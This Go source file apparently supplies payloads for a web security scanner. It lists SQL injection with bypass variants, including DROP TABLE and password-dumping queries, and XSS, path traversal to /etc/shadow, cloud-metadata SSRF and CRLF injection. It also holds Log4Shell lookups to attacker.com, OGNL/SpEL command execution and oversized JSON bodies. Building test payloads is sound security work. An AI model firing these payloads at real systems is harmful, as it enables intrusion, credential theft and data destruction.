// Advanced Payload Generators with Bypass Techniques

package main

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"net/url"
	"strings"
)

// SQL Injection Advanced Payloads with bypass techniques
func GetSQLiAdvancedPayloads() []AdvancedPayload {
	return []AdvancedPayload{
		{
			Name:       "OR_1=1_BASIC",
			RawPayload: `alice" OR "1"="1"`,
			Variants: []string{
				`alice" OR "1"="1"`,
				`alice' OR '1'='1'`,
				`alice' OR 1=1--`,
				`alice" OR "1"="1"--`,
				`alice'/**/OR/**/'1'='1`,
				`alice'%20OR%20'1'='1`,
				`alice%2522%2520OR%2520%25221%2522%253D%25221`,
			},
			Technique:   "boolean_based",
			ContentType: "application/json",
		},
		{
			Name:       "UNION_SELECT",
			RawPayload: `1 UNION SELECT null,username,password FROM users`,
			Variants: []string{
				`1 UNION SELECT null,username,password FROM users`,
				`1/*!50000UNION*/SELECT/*!50000null*/,username,password/*!50000FROM*/users`,
				`1+UNION+SELECT+null,username,password+FROM+users`,
				`1%20UNION%20SELECT%20null,username,password%20FROM%20users`,
				`1/**/UNION/**/SELECT/**/null,username,password/**/FROM/**/users`,
				`1%00UNION%00SELECT%00null,username,password%00FROM%00users`,
			},
			Technique:   "union_based",
			ContentType: "",
		},
		{
			Name:       "TIME_BASED_SLEEP",
			RawPayload: `x' AND SLEEP(5)--`,
			Variants: []string{
				`x' AND SLEEP(5)--`,
				`x" AND SLEEP(5)--`,
				`x'/**/AND/**/SLEEP(5)/**/--`,
				`x'%20AND%20SLEEP(5)--`,
				`x' AND BENCHMARK(5000000,MD5(1))--`,
				`x'; WAITFOR DELAY '0:0:5'--`,
				`x'; SELECT pg_sleep(5)--`,
			},
			Technique:   "time_based",
			ContentType: "application/json",
		},
		{
			Name:       "ERROR_BASED",
			RawPayload: `x' AND extractvalue(1,concat(0x7e,(SELECT version())))--`,
			Variants: []string{
				`x' AND extractvalue(1,concat(0x7e,(SELECT version())))--`,
				`x' AND 1=convert(int,(SELECT @@version))--`,
				`x' AND 1=CAST((SELECT version()) AS int)--`,
			},
			Technique:   "error_based",
			ContentType: "application/json",
		},
		{
			Name:       "STACKED_QUERIES",
			RawPayload: `x'; DROP TABLE users;--`,
			Variants: []string{
				`x'; DROP TABLE users;--`,
				`x'; INSERT INTO users VALUES ('hacked','password');--`,
				`x'; UPDATE users SET password='hacked' WHERE username='admin';--`,
			},
			Technique:   "stacked_queries",
			ContentType: "application/json",
		},
		{
			Name:       "COMMENT_BYPASS",
			RawPayload: `alice'/**/OR/**/1=1/**/--`,
			Variants: []string{
				`alice'/**/OR/**/1=1/**/--`,
				`alice'/*!50000OR*/1=1--`,
				`alice'/*!50553OR*/1=1--`,
				`alice'/*!12345OR*/1=1--`,
			},
			Technique:   "mysql_comment",
			ContentType: "application/json",
		},
		{
			Name:       "ENCODING_BYPASS",
			RawPayload: `alice%2522%2520OR%2520%25221%2522%253D%25221`,
			Variants: []string{
				`alice%2522%2520OR%2520%25221%2522%253D%25221`,
				`alice%2527%2520OR%2520%25271%2527%253D%25271`,
				`alice%27%20OR%20%271%27%3D%271`,
			},
			Technique:   "double_url_encode",
			ContentType: "application/json",
		},
	}
}

// XSS Advanced Payloads with multiple execution techniques
func GetXSSAdvancedPayloads() []AdvancedPayload {
	return []AdvancedPayload{
		{
			Name:       "SCRIPT_ALERT",
			RawPayload: `<script>alert('__V04_XSS__')</script>`,
			Variants: []string{
				`<script>alert('__V04_XSS__')</script>`,
				`<script>alert("__V04_XSS__")</script>`,
				`<script>alert(__V04_XSS__)</script>`,
				`<script >alert('__V04_XSS__')</script >`,
				`<script\t>alert('__V04_XSS__')</script>`,
			},
			Technique:   "basic_script",
			ContentType: "",
		},
		{
			Name:       "IMG_ONERROR",
			RawPayload: `<img src=x onerror=alert('__V04_XSS__')>`,
			Variants: []string{
				`<img src=x onerror=alert('__V04_XSS__')>`,
				`<img src=x onerror="alert('__V04_XSS__')">`,
				`<img src=x onerror='alert("__V04_XSS__")'>`,
				`<img src=x onerror=alert("__V04_XSS__")>`,
				`<IMG SRC=x ONERROR=alert('__V04_XSS__')>`,
				`<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#39;__V04_XSS__&#39;&#41;>`,
			},
			Technique:   "img_onerror",
			ContentType: "",
		},
		{
			Name:       "SVG_ONLOAD",
			RawPayload: `<svg onload=alert('__V04_XSS__')>`,
			Variants: []string{
				`<svg onload=alert('__V04_XSS__')>`,
				`<svg/onload=alert('__V04_XSS__')>`,
				`<svg onload="alert('__V04_XSS__')">`,
				`<svg xmlns="http://www.w3.org/2000/svg" onload="alert('__V04_XSS__')"/>`,
			},
			Technique:   "svg_onload",
			ContentType: "",
		},
		{
			Name:       "STRING_CONCAT",
			RawPayload: `<script>alert('ale'+'rt')('__V04_XSS__')</script>`,
			Variants: []string{
				`<script>['ale'+'rt']('__V04_XSS__')</script>`,
				`<script>window['ale'+'rt']('__V04_XSS__')</script>`,
				`<script>self['ale'+'rt']('__V04_XSS__')</script>`,
				`<script>top['ale'+'rt']('__V04_XSS__')</script>`,
				`<script>this['ale'+'rt']('__V04_XSS__')</script>`,
			},
			Technique:   "string_concat",
			ContentType: "",
		},
		{
			Name:       "FROMCHARCODE",
			RawPayload: `<script>eval(String.fromCharCode(97,108,101,114,116,40,39,95,95,86,48,52,95,88,83,83,95,95,39,41))</script>`,
			Variants: []string{
				`<script>eval(String.fromCharCode(97,108,101,114,116,40,39,95,95,86,48,52,95,88,83,83,95,95,39,41))</script>`,
				`<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,39,95,95,86,48,52,95,88,83,83,95,95,39,41))>`,
			},
			Technique:   "fromcharcode",
			ContentType: "",
		},
		{
			Name:       "UNICODE_ESCAPE",
			RawPayload: `<script>alert('__V04_XSS__')</script>`,
			Variants: []string{
				`<script>alert('__V04_XSS__')</script>`,
				`<script>\x61\x6c\x65\x72\x74('__V04_XSS__')</script>`,
			},
			Technique:   "unicode_escape",
			ContentType: "",
		},
		{
			Name:       "JS_CONTEXT_EVAL",
			RawPayload: `';alert('__V04_XSS__');'`,
			Variants: []string{
				`';alert('__V04_XSS__');'`,
				`";alert('__V04_XSS__');"`,
				`';alert(String.fromCharCode(95,95,86,48,52,95,88,83,83,95,95));'`,
			},
			Technique:   "js_context_break",
			ContentType: "",
		},
		{
			Name:       "HTML_ENTITY",
			RawPayload: `&lt;script&gt;alert('__V04_XSS__')&lt;/script&gt;`,
			Variants: []string{
				`<script>alert(&quot;__V04_XSS__&quot;)</script>`,
				`<img src=x onerror="alert(&#39;__V04_XSS__&#39;)">`,
				`<img src=x onerror="alert(&#x27;__V04_XSS__&#x27;)">`,
			},
			Technique:   "html_entity",
			ContentType: "",
		},
		{
			Name:       "ALTERNATIVE_FUNCTIONS",
			RawPayload: `<script>prompt('__V04_XSS__')</script>`,
			Variants: []string{
				`<script>prompt('__V04_XSS__')</script>`,
				`<script>confirm('__V04_XSS__')</script>`,
				`<script>console.log('__V04_XSS__')</script>`,
				`<script>document.write('__V04_XSS__')</script>`,
			},
			Technique:   "alternative_func",
			ContentType: "",
		},
		{
			Name:       "EVENT_HANDLER",
			RawPayload: `" onmouseover=alert('__V04_XSS__') "`,
			Variants: []string{
				`" onmouseover=alert('__V04_XSS__') "`,
				`" onclick="alert('__V04_XSS__')"`,
				`" onfocus=alert('__V04_XSS__') autofocus="`,
				`" onerror=alert('__V04_XSS__')"`,
			},
			Technique:   "event_handler",
			ContentType: "",
		},
		{
			Name:       "TEMPLATE_LITERAL",
			RawPayload: "`${alert('__V04_XSS__')}`",
			Variants: []string{
				"`${alert('__V04_XSS__')}`",
				"${alert('__V04_XSS__')}",
			},
			Technique:   "template_literal",
			ContentType: "",
		},
		{
			Name:       "POLYGLOT",
			RawPayload: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('__V04_XSS__') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>",
			Variants: []string{
				"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('__V04_XSS__') )",
				`''--></style></script><script>alert('__V04_XSS__')</script>`,
				`''--><svg onload=alert('__V04_XSS__')>`,
			},
			Technique:   "polyglot",
			ContentType: "",
		},
	}
}

// Stored XSS Payloads
func GetStoredXSSPayloads() []AdvancedPayload {
	return []AdvancedPayload{
		{
			Name:       "STORED_IMG",
			RawPayload: `<img src=x onerror=alert(1)>`,
			Variants: []string{
				`<img src=x onerror=alert(1)>`,
				`<img src=x onerror="alert(1)">`,
				`<IMG SRC=x ONERROR=alert(1)>`,
				`<img src="x" onerror="alert(1)">`,
			},
			Technique:   "stored_img",
			ContentType: "application/json",
		},
		{
			Name:       "STORED_SCRIPT",
			RawPayload: `<script>alert('stored')</script>`,
			Variants: []string{
				`<script>alert('stored')</script>`,
				`<scrIpt>alert('stored')</scrIpt>`,
			},
			Technique:   "stored_script",
			ContentType: "application/json",
		},
	}
}

// Path Traversal Advanced Payloads
func GetPathTraversalPayloads() []AdvancedPayload {
	return []AdvancedPayload{
		{
			Name:       "DOT_DOT_SLASH",
			RawPayload: "../../etc/passwd",
			Variants: []string{
				"../../etc/passwd",
				"../../../etc/passwd",
				"../../../../etc/passwd",
				"....//....//....//etc/passwd",
				"....\\....\\....\\etc\\passwd",
				"..%2f..%2f..%2fetc%2fpasswd",
			},
			Technique:   "dot_dot_slash",
			ContentType: "",
		},
		{
			Name:       "URL_ENCODED",
			RawPayload: "%2e%2e/%2e%2e/etc/passwd",
			Variants: []string{
				"%2e%2e/%2e%2e/etc/passwd",
				"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
				"..%252f..%252fetc%252fpasswd",
				"..%c0%af..%c0%afetc/passwd",
				"..%25c0%25af..%25c0%25afetc/passwd",
			},
			Technique:   "url_encoded",
			ContentType: "",
		},
		{
			Name:       "DOUBLE_ENCODING",
			RawPayload: "%252e%252e/%252e%252e/etc/passwd",
			Variants: []string{
				"%252e%252e/%252e%252e/etc/passwd",
				"..%255c..%255cetc/passwd",
				"%252e%252e%252fetc%252fpasswd",
			},
			Technique:   "double_encoding",
			ContentType: "",
		},
		{
			Name:       "UNICODE_BYPASS",
			RawPayload: "..%c0%af..%c0%afetc/passwd",
			Variants: []string{
				"..%c0%af..%c0%afetc/passwd",
				"..%c1%9c..%c1%9cetc/passwd",
				"%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
			},
			Technique:   "unicode_overlong",
			ContentType: "",
		},
		{
			Name:       "NULL_BYTE",
			RawPayload: "../../etc/passwd%00.jpg",
			Variants: []string{
				"../../etc/passwd%00.jpg",
				"../../etc/passwd%00.html",
				"../../etc/passwd%00.png",
			},
			Technique:   "null_byte",
			ContentType: "",
		},
		{
			Name:       "ALTERNATIVE_PATHS",
			RawPayload: "/etc/passwd",
			Variants: []string{
				"/etc/passwd",
				"/etc/shadow",
				"/etc/hosts",
				"/proc/self/environ",
				"/proc/self/cmdline",
				"/var/log/apache2/access.log",
				"C:\\Windows\\System32\\drivers\\etc\\hosts",
				"..\\..\\..\\windows\\win.ini",
			},
			Technique:   "alternative_paths",
			ContentType: "",
		},
		{
			Name:       "NESTED_TRAVERSAL",
			RawPayload: "....//....//....//etc/passwd",
			Variants: []string{
				"....//....//....//etc/passwd",
				"....\\....\\....\\etc\\passwd",
				"...//...//...//etc/passwd",
				"..../..../..../etc/passwd",
			},
			Technique:   "nested_traversal",
			ContentType: "",
		},
	}
}

// SSRF Advanced Payloads
func GetSSRFPayloads() []AdvancedPayload {
	return []AdvancedPayload{
		{
			Name:       "AWS_METADATA",
			RawPayload: "http://169.254.169.254/latest/meta-data/",
			Variants: []string{
				"http://169.254.169.254/latest/meta-data/",
				"http://169.254.169.254/latest/meta-data/iam/security-credentials/",
				"http://169.254.169.254/latest/user-data",
			},
			Technique:   "aws_metadata",
			ContentType: "application/json",
		},
		{
			Name:       "GCP_METADATA",
			RawPayload: "http://metadata.google.internal/computeMetadata/v1/",
			Variants: []string{
				"http://metadata.google.internal/computeMetadata/v1/",
				"http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
			},
			Technique:   "gcp_metadata",
			ContentType: "application/json",
		},
		{
			Name:       "ALTERNATIVE_IP_NOTATION",
			RawPayload: "http://2130706433/", // decimal 127.0.0.1
			Variants: []string{
				"http://2130706433/",
				"http://0177.0.0.1/",
				"http://0x7f000001/",
				"http://[::ffff:127.0.0.1]/",
				"http://127.1/",
			},
			Technique:   "alternative_ip",
			ContentType: "application/json",
		},
		{
			Name:       "DNS_REBINDING",
			RawPayload: "http://attacker.com/",
			Variants: []string{
				"http://attacker.com/",
				"http://attacker-controlled-domain.com/internal",
				"http://make-127.0.0.1-rr.1wb.re/",
			},
			Technique:   "dns_rebinding",
			ContentType: "application/json",
		},
		{
			Name:       "IPV6_LOCALHOST",
			RawPayload: "http://[::1]/",
			Variants: []string{
				"http://[::1]/",
				"http://[::ffff:127.0.0.1]/",
				"http://[fd00:ec2::254]/",
			},
			Technique:   "ipv6_localhost",
			ContentType: "application/json",
		},
	}
}

// CRLF Injection Advanced Payloads
func GetCRLFPayloads() []AdvancedPayload {
	return []AdvancedPayload{
		{
			Name:       "CRLF_BASIC",
			RawPayload: "value\r\nX-Injected: __V10_CRLF__",
			Variants: []string{
				"value\r\nX-Injected: __V10_CRLF__",
				"value\rX-Injected: __V10_CRLF__",
				"value\nX-Injected: __V10_CRLF__",
				"value%0d%0aX-Injected: __V10_CRLF__",
				"value%0dX-Injected: __V10_CRLF__",
				"value%0aX-Injected: __V10_CRLF__",
			},
			Technique:   "crlf_basic",
			ContentType: "",
		},
		{
			Name:       "HEADER_INJECTION",
			RawPayload: "value\r\nSet-Cookie: injected=true",
			Variants: []string{
				"value\r\nSet-Cookie: injected=true",
				"value\r\nLocation: http://evil.com",
				"value\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK",
			},
			Technique:   "response_splitting",
			ContentType: "",
		},
	}
}

// Supply Chain Attack Payloads (Log4Shell, etc)
func GetSupplyChainPayloads() []AdvancedPayload {
	return []AdvancedPayload{
		{
			Name:       "LOG4SHELL_BASIC",
			RawPayload: "${jndi:ldap://attacker.com/Exploit}",
			Variants: []string{
				"${jndi:ldap://attacker.com/Exploit}",
				"${jndi:rmi://attacker.com/Exploit}",
				"${jndi:dns://attacker.com}",
				"${jndi:ldaps://attacker.com/Exploit}",
			},
			Technique:   "jndi_injection",
			ContentType: "application/json",
		},
		{
			Name:       "LOG4SHELL_OBFUSCATED",
			RawPayload: "${${lower:j}ndi:${lower:l}dap://attacker.com/Exploit}",
			Variants: []string{
				"${${lower:j}ndi:${lower:l}dap://attacker.com/Exploit}",
				"${${upper:j}ndi:${upper:l}dap://attacker.com/Exploit}",
				"${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/Exploit}",
			},
			Technique:   "log4shell_obfuscated",
			ContentType: "application/json",
		},
		{
			Name:       "OGNL_INJECTION",
			RawPayload: "%{@java.lang.Runtime@getRuntime().exec('id')}",
			Variants: []string{
				"%{@java.lang.Runtime@getRuntime().exec('id')}",
				"${@java.lang.Runtime@getRuntime().exec('id')}",
				"#cmd='id',#proc=new java.lang.ProcessBuilder(#cmd).start()",
			},
			Technique:   "ognl_injection",
			ContentType: "application/json",
		},
		{
			Name:       "SPEL_INJECTION",
			RawPayload: "${T(java.lang.Runtime).getRuntime().exec('id')}",
			Variants: []string{
				"${T(java.lang.Runtime).getRuntime().exec('id')}",
				"${T(org.springframework.cglib.core.ReflectUtils).defineClass('Exploit',T(java.util.Base64).getDecoder().decode('...'),T(org.springframework.core.io.ResourceLoader).getClassLoader())}",
			},
			Technique:   "spel_injection",
			ContentType: "application/json",
		},
	}
}

// Oversized Payload (>1 MB)
func GetOversizedPayloads() []AdvancedPayload {
	// Generate a ~2MB payload
	bigString := strings.Repeat("x", 2_000_000)
	oversizedJSON := `{"username":"` + bigString + `","password":"x"}`

	return []AdvancedPayload{
		{
			Name:       "OVERSIZE_LOGIN",
			RawPayload: "2MB username field in /login",
			Variants: []string{
				oversizedJSON,
			},
			Technique:   "oversized_body",
			ContentType: "application/json",
		},
	}
}

// Deeply Nested JSON (>100 levels)
func GetDeeplyNestedPayloads() []AdvancedPayload {
	// Generate a JSON with 105 nesting levels
	prefix := `{"amount":5`
	nesting := strings.Repeat(`,"x":{`, 105)
	inner := `"y":1`
	closing := strings.Repeat("}", 105)
	deepJSON := prefix + nesting + inner + closing + "}"

	return []AdvancedPayload{
		{
			Name:       "NESTED_105",
			RawPayload: "JSON with 105 nesting levels",
			Variants: []string{
				deepJSON,
			},
			Technique:   "deep_nesting",
			ContentType: "application/json",
		},
	}
}

// Helper functions for encoding
func doubleURLEncode(s string) string {
	return url.QueryEscape(url.QueryEscape(s))
}

func hexEncode(s string) string {
	return hex.EncodeToString([]byte(s))
}

func base64Encode(s string) string {
	return base64.StdEncoding.EncodeToString([]byte(s))
}

func toCharCodeArray(s string) string {
	var codes []string
	for _, c := range s {
		codes = append(codes, fmt.Sprintf("%d", c))
	}
	return strings.Join(codes, ",")
}

func generateSQLiCommentVariants(payload string) []string {
	commentStyles := []string{
		"/**/",
		"/*!50000*/",
		"/*!50553*/",
		"/*!(select(1))*/",
		"/*!*/",
	}

	variants := []string{payload}
	for _, comment := range commentStyles {
		// Replace spaces with comments
		variant := strings.ReplaceAll(payload, " ", comment)
		variants = append(variants, variant)
	}
	return variants
}
